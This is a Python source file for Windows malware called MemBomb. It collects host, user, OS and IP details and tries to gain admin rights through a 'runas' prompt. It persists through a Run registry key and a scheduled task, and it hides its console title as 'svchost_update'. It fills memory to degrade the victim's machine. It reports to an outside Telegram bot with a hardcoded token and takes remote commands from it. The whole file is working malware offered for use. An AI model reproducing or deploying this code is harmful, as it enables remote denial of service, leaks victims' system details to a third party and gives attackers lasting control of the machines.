import os
import sys
import json
import time
import ctypes
import socket
import platform
import threading
import subprocess
import urllib.request
import urllib.parse

# ================= CONFIG =================
BOT_TOKEN     = "7477379290:AAFgElELliINKbt6IxsnCXzPj7FQHXgVQrI"
CHAT_ID       = "7454474616"
CHUNK_MB      = 256
MAX_PERCENT   = 85
MAX_THREADS   = 16
POLL_TIMEOUT  = 20
PROCESS_NAME  = "svchost_update"
# ==========================================

class MemBomb:
    def __init__(self):
        self.lock = threading.Lock()
        self.blobs = []
        self.threads = []
        self.running = True
        self.start = time.time()
        self.admin = self._is_admin()
        self.recon = self._recon()

    # ---------- system ----------
    def _is_admin(self):
        try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except: return False

    def _mem_percent(self):
        try:
            class MS(ctypes.Structure):
                _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                            ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                            ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                            ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                            ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
            m = MS(); m.dwLength = ctypes.sizeof(MS)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            return m.dwMemoryLoad
        except: return 0

    def _recon(self):
        try: ip = socket.gethostbyname(socket.gethostname())
        except: ip = "?"
        return {"host": os.environ.get("COMPUTERNAME", "?"),
                "user": os.environ.get("USERNAME", "?"),
                "os": platform.platform(), "ip": ip}

    def _elevate(self):
        if self.admin: return
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                '"' + os.path.abspath(sys.argv[0]) + '"', None, 1)
            sys.exit(0)
        except: self.admin = False

    def _persist(self):
        exe = os.path.abspath(sys.argv[0])
        cmd = f'"{sys.executable}" "{exe}"'
        try:
            subprocess.run(["reg", "add", r"Software\Microsoft\Windows\CurrentVersion\Run",
                "/v", "MemBomb", "/t", "REG_SZ", "/d", cmd, "/f"], capture_output=True)
        except: pass
        try:
            subprocess.run(["schtasks", "/create", "/tn", "MemBombUpdate", "/tr", cmd,
                "/sc", "onlogon", "/rl", "highest", "/f"], capture_output=True)
        except: pass

    def _set_proc_name(self):
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(PROCESS_NAME)
        except: pass

    # ---------- memory engine ----------
    def _eat(self):
        while self.running:
            if self._mem_percent() >= MAX_PERCENT:
                time.sleep(0.7); continue
            try:
                with self.lock:
                    self.blobs.append(bytearray(os.urandom(CHUNK_MB*1024*1024)))
            except MemoryError:
                time.sleep(1)

    def spawn(self, n):
        with self.lock:
            room = MAX_THREADS - sum(1 for t in self.threads if t.is_alive())
            n = min(n, max(room, 0))
        for _ in range(n):
            t = threading.Thread(target=self._eat, daemon=True)
            t.start(); self.threads.append(t)
        return n

    def free(self):
        with self.lock:
            n = len(self.blobs); self.blobs = []
        return n

    def stats(self):
        return {"ram": self._mem_percent(), "blobs": len(self.blobs),
                "threads": sum(1 for t in self.threads if t.is_alive())}

    # ---------- telegram ----------
    def tg(self, text):
        try:
            urllib.request.urlopen(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                urllib.parse.urlencode({"chat_id": CHAT_ID, "text": text}).encode(), timeout=8)
        except: pass

    def poll(self):
        last = 0
        while True:
            try:
                url = (f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
                       f"?offset={last+1}&timeout={POLL_TIMEOUT}")
                r = json.loads(urllib.request.urlopen(url, timeout=POLL_TIMEOUT+5).read())
                for u in r.get("result", []):
                    last = u["update_id"]
                    m = u.get("message")
                    if not m or str(m.get("from", {}).get("id")) != CHAT_ID: continue
                    self.handle((m.get("text") or "").strip().lower())
            except: time.sleep(3)

    def handle(self, cmd):
        p = cmd.split()
        if cmd == "/status":
            s = self.stats()
            self.tg(f"🖥 {self.recon['host']} | admin={self.admin} | RAM={s['ram']}% | blobs={s['blobs']} | threads={s['threads']} | up={int(time.time()-self.start)}s")
        elif p and p[0] == "/eat":
            n = int(p[1]) if len(p) > 1 and p[1].isdigit() else 4
            self.tg(f"🔥 +{self.spawn(n)} threads")
        elif cmd == "/stop":
            self.running = False; self.tg("🛑 stopped")
        elif cmd == "/free":
            self.running = False; self.tg(f"🧹 freed {self.free()}")
        elif cmd == "/persist":
            self._persist(); self.tg("♻️ persistence reinstalled")
        elif cmd == "/info":
            self.tg(f"path={os.path.abspath(sys.argv[0])}\npid={os.getpid()}\nip={self.recon['ip']}")
        elif cmd == "/kill":
            self.tg("💀 bye"); os._exit(0)

    # ---------- run ----------
    def run(self):
        self._set_proc_name()
        self._elevate()
        self._persist()
        self.tg(f"🚀 online: {self.recon['host']}/{self.recon['user']} {self.recon['os']}")
        self.spawn(4)
        threading.Thread(target=self.poll, daemon=True).start()
        while True: time.sleep(1)

if __name__ == "__main__":
    MemBomb().run()